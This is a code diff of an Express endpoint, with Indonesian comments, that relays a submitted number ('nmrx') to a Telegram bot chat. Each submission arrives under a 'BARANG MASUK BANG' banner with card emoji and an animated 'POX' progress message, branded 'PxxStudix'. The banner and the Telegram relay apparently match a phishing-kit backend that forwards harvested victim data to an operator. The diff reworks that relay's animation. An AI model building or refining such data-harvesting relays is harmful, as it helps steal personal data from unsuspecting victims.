@@ -40,98 +40,76 @@ app.post("/nmrx", async (req, res) => {
         if (!nmrx) {
 
             return res.status(400).json({
-
-                success: false,
-                message: "Data tidak lengkap"
-
+                success: false
             });
 
         }
 
-        /* ANIMASI */
-const frames = [
-    "POX .",
-    "POX ..",
-    "POX ...",
-    "POX ...."
-];
+        const frames = [
+            "POX .",
+            "POX ..",
+            "POX ...",
+            "POX ...."
+        ];
 
-for(let i = 0; i < 20; i++){
-
-    await new Promise(resolve =>
-        setTimeout(resolve, 1000)
-    );
-
-    const frame =
-    frames[i % frames.length];
-
-    /* CHAR INVISIBLE */
-    const hidden =
-    "\u200B".repeat(i + 1);
-
-    await axios.post(
-    `https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`,
-    {
-        chat_id: CHAT_ID,
-        message_id: messageId,
-        text: `
-💳 <b>| BARANG MASUK BANG |</b> 💳
-
-× <code>${nmrx}</code> ×
-
-<b>× NMR ×</b> : <b>${nmrx}</b>
-
-<i>${frame}</i>${hidden}
-
-<b>©️ By PxxStudix</b>
-        `,
-        parse_mode: "HTML"
-    });
-
-}
-
-        const messageId =
-            sent.data.result.message_id;
+        let oldMessageId = null;
 
         /* ANIMASI */
-        for (let i = 0; i < 12; i++) {
-
-            await new Promise(resolve =>
-                setTimeout(resolve, 800)
-            );
+        for(let i = 0; i < 8; i++){
 
             const frame =
-                frames[i % frames.length];
+            frames[i % frames.length];
 
-            await axios.post(
-                `https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`,
-                {
-                    chat_id: CHAT_ID,
-                    message_id: messageId,
-                    text: `
+            /* HAPUS PESAN LAMA */
+            if(oldMessageId){
+
+                try{
+
+                    await axios.post(
+                    `https://api.telegram.org/bot${BOT_TOKEN}/deleteMessage`,
+                    {
+                        chat_id: CHAT_ID,
+                        message_id: oldMessageId
+                    });
+
+                }catch(e){}
+
+            }
+
+            /* KIRIM PESAN BARU */
+            const sent = await axios.post(
+            `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+            {
+                chat_id: CHAT_ID,
+                text: `
 💳 <b>| BARANG MASUK BANG |</b> 💳
 
 × <code>${nmrx}</code> ×
 
 <b>× NMR ×</b> : <b>${nmrx}</b>
 
-<i>${frame} ${i}</i>
+<i>${frame}</i>
 
 <b>©️ By PxxStudix</b>
-                    `,
-                    parse_mode: "HTML"
-                }
+                `,
+                parse_mode: "HTML"
+            });
+
+            oldMessageId =
+            sent.data.result.message_id;
+
+            await new Promise(resolve =>
+                setTimeout(resolve, 700)
             );
 
         }
 
-        /* PESAN AKHIR */
+        /* PESAN FINAL */
         await axios.post(
-            `https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`,
-            {
-                chat_id: CHAT_ID,
-                message_id: messageId,
-                text: `
+        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+        {
+            chat_id: CHAT_ID,
+            text: `
 💳 <b>| BARANG MASUK BANG |</b> 💳
 
 × <code>${nmrx}</code> ×
@@ -141,28 +119,20 @@ for(let i = 0; i < 20; i++){
 <i>POX DONE ✅</i>
 
 <b>©️ By PxxStudix</b>
-                `,
-                parse_mode: "HTML"
-            }
-        );
+            `,
+            parse_mode: "HTML"
+        });
 
         res.json({
-
             success: true
-
         });
 
     } catch (error) {
 
-        console.log(
-            error.response?.data ||
-            error.message
-        );
+        console.log(error.message);
 
         res.status(500).json({
-
             success: false
-
         });
 
     }
